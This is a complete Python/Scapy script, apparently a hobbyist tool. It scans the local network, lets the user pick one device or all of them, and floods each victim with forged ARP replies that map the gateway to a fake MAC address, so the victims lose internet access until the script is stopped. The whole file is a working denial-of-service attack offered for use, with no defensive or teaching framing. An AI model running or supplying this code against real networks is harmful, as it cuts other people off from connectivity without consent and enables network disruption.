#!/usr/bin/python2.7

import time
import os
from scapy.all import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_ip_macs(ips):
  """
  Returns a list of tupples containing the (ip, mac address)
  of all of the computers on the network
  """
  answers, uans = arping(ips, verbose=0)
  res = []
  for answer in answers:
    mac = answer[1].hwsrc
    ip  = answer[1].psrc
    res.append((ip, mac))
  return res


def poison(victim_ip, victim_mac, gateway_ip):
  """
  Send the victim an ARP packet pairing the gateway ip with the wrong
  mac address
  """
  packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', \
  pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)


def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
  """
  Send an ARP packet to the victim repairing their MAC address with the correct
  IP address.
  """
  packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, \
  hwdst=victim_mac)
  send(packet, verbose=0)


def get_lan_ip():
  """
  Gets the current LAN's IP by connecting to google and extracting the IP from
  the socket.
  """
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("google.com", 80))
  ip = s.getsockname()
  s.close()
  return ip[0]


def printdiv():
  print '--------------------'

def check_for_root():
    """
    Checks that the script was executed under the status of a superuser.
    """
    if os.geteuid() != 0:
      print "You need to run the script as a superuser."
      exit()

if __name__=="__main__":
    # Check for root
    check_for_root()
    # Search for targets every time we refresh
    refreshing = True
    gateway_mac = '12:34:56:78:9A:BC' # A default (bad) gateway mac address

    while refreshing:
      # Use the current ip XXX.XXX.XXX.XXX and get a string in
      # the form "XXX.XXX.XXX.*" and "XXX.XXX.XXX.1". Right now,
      # the script assumes that the default gateway is "XXX.XXX.XXX.1"
      myip = get_lan_ip()
      ip_list = myip.split('.')
      del ip_list[-1]
      ip_list.append('*')
      ip_range = '.'.join(ip_list)
      del ip_list[-1]
      ip_list.append('1')
      gateway_ip = '.'.join(ip_list)

      # Get a list of devices and print them to the screen
      devices = get_ip_macs(ip_range)
      printdiv()
      print "Connected ips:"
      i = 0
      for device in devices:
        print '%s)\t%s\t%s' % (i, device[0], device[1])
        # See if we have the gateway MAC
        if device[0] == gateway_ip:
          gateway_mac = device[1]
        i+=1

      printdiv()
      print 'Gateway ip:  %s' % gateway_ip
      if gateway_mac != '12:34:56:78:9A:BC':
        print "Gateway mac: %s" % gateway_mac
      else:
        print 'Gateway not found. Script will be UNABLE TO RESTORE WIFI once shutdown is over'
      printdiv()

      print "Who do you want to block?"
      print "(r - Refresh, a - Kill all, q - quit)"

      input_is_valid = False # flag to break out of input loop
      killall = False # flag for blocking access to all

      # Input loop
      while not input_is_valid:
        choice = raw_input(">") # receive input

        # A digit means a single target was chosen
        if choice.isdigit():
          if int(choice) < len(devices) and int(choice) >= 0:
            refreshing = False
            input_is_valid = True

        # Block access for everyone on the list
        elif choice is 'a':
          killall = True
          input_is_valid = True
          refreshing = False

        # Refresh list of targets
        elif choice is 'r':
          input_is_valid = True

        # Quit
        elif choice is 'q':
          exit()

        # Check for choice validity
        if not input_is_valid:
          print 'Please enter a valid choice'

# Block one target from access
    if choice.isdigit():
      choice = int(choice)
      victim = devices[choice]
      print "Preventing %s from accessing the internet..." % victim[0]

      try:
        while True:
          poison(victim[0], victim[1], gateway_ip)
      except KeyboardInterrupt:
          restore(victim[0], victim[1], gateway_ip, gateway_mac)

# block all from access
    elif killall:
      try:
        while True:
          for victim in devices:
            poison(victim[0], victim[1], gateway_ip)

      except KeyboardInterrupt:
        # cleanup
        for victim in devices:
          restore(victim[0], victim[1], gateway_ip, gateway_mac)

